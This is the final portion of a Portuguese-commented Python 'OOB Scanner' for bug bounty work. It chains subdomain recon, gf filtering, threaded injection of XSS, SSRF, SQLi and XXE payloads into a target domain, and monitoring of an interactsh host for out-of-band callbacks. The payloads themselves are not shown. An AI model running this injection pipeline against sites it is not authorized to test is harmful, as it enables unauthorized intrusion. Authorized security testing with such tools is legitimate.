    total_payloads = len(plog.entries)
    lines = [
        "=" * 70,
        "  OOB SCANNER v2 — SUMÁRIO FINAL",
        f"  Gerado em : {datetime.now(timezone.utc).isoformat()}",
        "=" * 70,
        f"  Payloads enviados : {total_payloads}",
        f"  OOB hits          : {len(hits)}",
        f"  Taxa de hit       : {len(hits)/max(total_payloads,1)*100:.1f}%",
        "",
    ]

    # Agrupa hits por categoria
    by_cat: dict[str, list] = {}
    for h in hits:
        m = h.get("matched_entry") or {}
        cat = m.get("category", "unknown")
        by_cat.setdefault(cat, []).append(h)

    if by_cat:
        lines.append("  ─── HITS POR CATEGORIA ───")
        for cat, cat_hits in sorted(by_cat.items()):
            lines.append(f"  {cat.upper():15} {len(cat_hits)} hit(s)")
        lines.append("")

    if hits:
        lines.append("  ─── DETALHES ───")
        for i, h in enumerate(hits, 1):
            m = h.get("matched_entry") or {}
            lines += [
                f"\n  [Hit #{i}]",
                f"    Protocolo  : {h['protocol']}",
                f"    Remote IP  : {h['remote_addr']}",
                f"    Recebido   : {h['received_at']}",
                f"    Delay      : {h.get('delay_str', '?')} após envio",
                f"    Categoria  : {m.get('category','?')}",
                f"    URL        : {m.get('url','?')}",
                f"    Parâmetro  : {m.get('param','?')}",
                f"    Payload    : {m.get('payload','?')}",
            ]
    else:
        lines.append("  Nenhum hit OOB registrado nesta sessão.")
        lines.append("  Dica: hits DNS/blind podem demorar — use --monitor-time maior.")

    summary_file.write_text("\n".join(lines), encoding="utf-8")
    log(f"\n  Sumário salvo: {summary_file}", C.GREEN)

# ─── CLI ─────────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="OOB Scanner v2 — Bug Bounty Automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Execução completa
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun

  # Rápido: só XSS e SSRF, 5 threads, delay 1s
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --categories xss ssrf --threads 5 --delay 1.0

  # Reutiliza recon anterior
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --skip-recon

  # Longo monitoramento (blind SQLi DNS pode demorar)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --monitor-time 1800 --categories sqli xxe

  # Com proxy (ex: Burp Suite)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --proxy http://127.0.0.1:8080

  # Só monitorar (payloads já enviados em sessão anterior)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --poll --monitor-time 600
        """
    )
    p.add_argument("-d", "--domain",       required=True,  help="Domínio alvo")
    p.add_argument("-o", "--oob",          required=True,  help="Host interactsh (ex: abc.oast.fun)")
    p.add_argument("--skip-recon",         action="store_true", help="Pula reconhecimento")
    p.add_argument("--skip-inject",        action="store_true", help="Pula injeção")
    p.add_argument("--poll",               action="store_true", help="Só monitora OOB")
    p.add_argument("--monitor-time",       type=int,   default=300,  metavar="S",
                   help="Duração do monitoramento em segundos (default: 300)")
    p.add_argument("--delay",              type=float, default=0.3,  metavar="S",
                   help="Delay entre requisições por thread (default: 0.3)")
    p.add_argument("--threads",            type=int,   default=3,    metavar="N",
                   help="Threads de injeção paralelas (default: 3)")
    p.add_argument("--categories",         nargs="+",  metavar="CAT",
                   choices=list(PAYLOADS.keys()),
                   help="Categorias a injetar (default: todas)")
    p.add_argument("--proxy",              default="",   metavar="URL",
                   help="Proxy HTTP (ex: http://127.0.0.1:8080)")
    p.add_argument("--output-dir",         default="oob_results", metavar="DIR",
                   help="Diretório de saída (default: oob_results/)")
    return p.parse_args()

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    banner()
    args = parse_args()

    # Sanitiza domínio — previne command injection residual
    if not re.match(r'^[a-zA-Z0-9.\-]+$', args.domain):
        print(f"{C.RED}Domínio inválido: {args.domain}{C.RESET}")
        sys.exit(1)

    out = Path(args.output_dir) / args.domain.replace(".", "_")
    out.mkdir(parents=True, exist_ok=True)

    global logger
    logger = setup_logging(out)

    log(f"Alvo     : {args.domain}", C.CYAN + C.BOLD)
    log(f"OOB Host : {args.oob}",    C.CYAN + C.BOLD)
    log(f"Threads  : {args.threads}", C.CYAN)
    log(f"Delay    : {args.delay}s",  C.CYAN)
    log(f"Output   : {out}/",         C.CYAN)
    if args.proxy:
        log(f"Proxy    : {args.proxy}", C.CYAN)

    plog = PayloadLog(out / "payload_log.jsonl")

    # ── Modo: só poll ─────────────────────────────────────────────────────────
    if args.poll:
        # Tenta recarregar payload_log de sessão anterior
        plog_file = out / "payload_log.jsonl"
        if plog_file.exists():
            for line in plog_file.read_text().splitlines():
                try:
                    e = json.loads(line)
                    plog._by_uid[e["uid"]] = e
                    plog._all.append(e)
                except Exception:
                    pass
            log(f"  Carregados {len(plog._all)} payloads do log anterior.", C.DIM)
        phase_monitor(args.oob, plog, out, args.monitor_time)
        return

    # ── Fase 1: Recon ─────────────────────────────────────────────────────────
    live_urls_file = out / "live_urls.txt"
    if not args.skip_recon:
        live_urls_file = phase_recon(args.domain, out)
    else:
        if not live_urls_file.exists():
            log("live_urls.txt não encontrado. Rode sem --skip-recon.", C.RED, "error")
            sys.exit(1)
        log(f"Recon pulado. Usando: {live_urls_file}", C.YELLOW)

    # ── GF ────────────────────────────────────────────────────────────────────
    category_files = phase_gf(live_urls_file, out)
    if args.categories:
        category_files = {k: v for k, v in category_files.items()
                          if k in args.categories}

    if not category_files:
        log("Nenhum endpoint encontrado após filtragem gf.", C.YELLOW, "warning")

    # ── Fase 2 + 3 em paralelo ───────────────────────────────────────────────
    if not args.skip_inject and category_files:
        # Inicia monitor em thread separada ANTES de começar injeção
        # → captura hits que chegam enquanto ainda está injetando
        monitor_thread = phase_monitor(
            args.oob, plog, out, args.monitor_time, parallel=True
        )
        log("  Monitor OOB iniciado em background.", C.DIM)

        phase_inject(category_files, args.oob, out, plog,
                     delay=args.delay, threads=args.threads, proxy=args.proxy)

        if monitor_thread and monitor_thread.is_alive():
            remaining = args.monitor_time
            log(f"\n  Injeção concluída. Aguardando monitor por mais {remaining}s...",
                C.CYAN)
            monitor_thread.join(timeout=remaining)
    else:
        if args.skip_inject:
            log("Injeção pulada (--skip-inject).", C.YELLOW)
        phase_monitor(args.oob, plog, out, args.monitor_time)

    log(f"\n{'═'*60}", C.GREEN)
    log(f"  Concluído. Resultados em: {out}/", C.GREEN + C.BOLD)
    log(f"{'═'*60}\n", C.GREEN)


if __name__ == "__main__":
    def _sigint(s, f):
        print(f"\n{C.YELLOW}  Interrompido.{C.RESET}")
        sys.exit(0)
    signal.signal(signal.SIGINT, _sigint)
    main()
